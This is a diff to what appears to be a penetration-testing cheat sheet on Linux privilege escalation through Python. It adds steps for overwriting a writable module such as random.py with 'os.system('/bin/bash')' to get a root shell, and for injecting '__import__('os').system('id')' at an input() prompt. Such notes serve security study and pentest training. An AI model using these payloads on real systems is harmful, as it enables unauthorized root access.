@@ -33,3 +33,23 @@
 #### 3) Insert payload (import os;os.system('/bin/bash')
 
 #### 4) GGEZ
+
+# MODULE OVERRIDING 
+
+#### If the Python script contains a module that can be modified by current user, we can inject arbitrary code into the module.
+
+#### 1) First, check what modules the Python script uses.
+
+#### 2) find / -name "random.py" 2>/dev/null
+
+#### 3) ls -la /usr/lib/python3.6/random.py
+
+#### 4) If we have write permissions on the file, we can inject our own malicious code for privesc (import os; os.system('/bin/bash')
+
+#### 5) Execute for root shell ;)
+
+# OS COMMANDS IN INPUT()
+
+#### 1) If the python executable asks for input, you can try to enter OS commands like:
+
+#### 2) Input: __import__('os').system('id')
